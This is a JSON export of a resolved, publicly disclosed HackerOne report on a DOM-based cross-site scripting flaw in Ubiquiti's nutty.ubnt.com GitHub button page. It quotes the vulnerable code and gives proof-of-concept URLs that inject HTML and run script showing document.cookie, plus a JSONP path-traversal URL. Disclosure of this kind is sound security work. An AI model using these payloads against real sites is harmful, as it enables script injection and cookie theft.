{
  "id": 200753,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDA3NTM=",
  "url": "https://hackerone.com/reports/200753",
  "title": "[nutty.ubnt.com] DOM Based XSS nuttyapp github-btn.html",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-01-24T12:14:22.147Z",
  "submitted_at": "2017-01-24T12:14:22.147Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bobrov",
    "url": "/bobrov",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 800,
    "url": "https://hackerone.com/ui",
    "handle": "ui",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Ubiquiti Inc.",
      "twitter_handle": "ubiquiti",
      "website": "https://ui.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-03-30T11:18:05.422Z",
  "bug_reporter_agreed_on_going_public_at": "2017-03-09T19:06:48.348Z",
  "team_member_agreed_on_going_public_at": "2017-03-30T11:18:05.384Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Description\n===\n\n**Vulnerable parameter:** user\n**Vulnerable script:** http://nutty.ubnt.com/github-btn.html\n**Vulnerable code:**\n```js\n  var params = function () {\n    var vars = [], hash;\n    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');\n    for(var i = 0; i < hashes.length; i++) {\n      hash = hashes[i].split('=');\n      vars.push(hash[0]);\n      vars[hash[0]] = hash[1];\n    }\n    return vars;\n  }()\n  var user = params.user,\n      repo = params.repo,\n      type = params.type,\n ...\n  } else if (type == 'follow') {\n    mainButton.className += ' github-me';\n    text.innerHTML = 'Follow @' + user;\n```\n\nPoCs\n===\n\n\n**PoC #1** \nHTML Injection for Chrome, Internet Explorer\n```\nhttp://nutty.ubnt.com/github-btn.html?#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow\n```\n\n**PoC #2**\nXSS for Internet Explorer (using X-UA-Compatible IE=9)\n```\nhttp://bb.blackfan.ru/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27http://nutty.ubnt.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E\n```\n\n{F154666}\n\n\nAnother vulns\n===\n\nAlso, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.\nBut for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).\n\n```js\n  function jsonp(path) {\n    var el = document.createElement('script');\n    el.src = path + '?callback=callback';\n    head.insertBefore(el, head.firstChild);\n  }\n...\n  if (type == 'follow') {\n    jsonp('https://api.github.com/users/' + user);\n  } else {\n    jsonp('https://api.github.com/repos/' + user + '/' + repo);\n  }\n```\n\n**PoC**\n```\nhttp://nutty.ubnt.com/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork\n```\n\n**Result**\n```\nhttps://api.github.com/another/endpoint?callback=callback\n```",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 154666,
      "file_name": "Screenshot_at_15-59-15.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/154/666/f4e0e50c7dc27103df2e5311575c7bd1b75ed8f0/Screenshot_at_15-59-15.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_15-59-15.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_15-59-15.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYHMKEKRC%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T230752Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDJMPTJY2Ir2MOCLrdRMnnjxUpuyBJjyMSNuEDmlSHuBAIhANPVh52Ag0ZhlNPMGw44%2B0wevQudlqNF3Xg6fRQMKiFjKrEFCB4QAxoMMDEzNjE5Mjc0ODQ5IgyIhbXp9Yg8uGlqM1QqjgWWsiaoe3I%2BSF7WxGq8IIhnVidUmZ%2F8C%2FhUgt8ldnpR11DICo9gXh0RZgZsnCVexOzrGuHMb16wqqfd8WQOAoJlOV1x72U3%2B6rjq0CLxhNhln%2FfEHgG31Sr7%2FrDSk3RKRGFOBTJWAQoAjFJnTJuZZ8iB6fayGRovsupR4yLVzJA83j8cj2n%2BEB%2Bs53pwmSpAq8rxnz9u4FIa%2B3%2BfIo05PSkTgHzWzRNNmC2o71Rc%2Bb2rYR1nDD4gGSurav%2FbrG%2FKpRrZI1V8pjr6ExTqDkyBeVD9na1ElVsFCY857mdjS9FXEqdmhf%2BauA0xpXkIVGF53wiSv5M%2BVNtV2%2BfzkFOQrz7F2ye5ED0%2BZ6yMxfoXzdGfqNIR0mtJRPYOVS%2FIDmrs98mPLHMrVXdW3BI8V876%2FdPUYJWumYigNynQ4CgDn67p%2BDNnV9A9PCEkb8ncroo3bqlhL9xtNhjcoUOmlDFKZ9IW046vzLFM3hY6nDX%2FCGFqZPvpyrCeukGZaMVhzsu0m%2BiOPpKkP0I2KiTJLiH0QfvqeKiuBPcpA9A%2BDjFlpMjYm%2BmrUjsJBj8I817PdjmifBAvJJBZmnzBHNtX3XpDWFTN2%2B8YdDSs4JnQce8cQ%2FgSll5wEqYAPGEbVXj6ZX4SZbwbRSt1fdPF7nhRAj92J9CBe4hyri7YYmVEBPuWtxdIp9oNOf7YIgBOYjxy4e5o4OEa2pen31rGqhCRXu1Rv5nDd8oHsji4cDy1xxQfASYHC9jkNHYaHFmKHs0RBVGQdEXa01q9t6Yt%2FMn80NulQaE5nqUuk%2F4YzOoe9CA%2FjeqNxMbnyk58tWVucpohqQeX0MQehKQ8cOvtjAEC63wZYyXpl6tTQY8Q0abSfPrtrUwv8%2FBxgY6sAF3RlFkBTDPOiSRIxQuSZc%2Fd3HVNzgDeHk03X20ZUfQXfQbd%2FlCxpmIFwoHLwWD4ZKv9oYtwyy0uSPXTyoVz3O7mwEOTOrq182tY%2BpcE%2BBDUfzyADgimUIfFAHPkQpe55dbUMq26YP4UOyD3TlXhsW%2B6SLeClfDefdoqWzRKCd29rzU9kQf7VFClo4z4bQhRTCB3Q9QmM9aLDYvrVAvrBiR5wn5y%2BiT%2BlODJolyFTOmRA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c4cc4e4a11fefa065cf766ef3f8f4d7f809a028eea9d4a3b3c2f96990095bad6",
      "file_size": 39757,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2017-04-08T19:06:48.383Z",
  "allow_singular_disclosure_after": -266817664.45127788,
  "singular_disclosure_allowed": true,
  "vote_count": 17,
  "voters": [
    "bobrov",
    "h4x0r_dz",
    "ysx",
    "0nlymohammed",
    "malcolmx",
    "mpz",
    "dz_samir",
    "eveeez",
    "khizer47",
    "ak1t4",
    "and 7 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
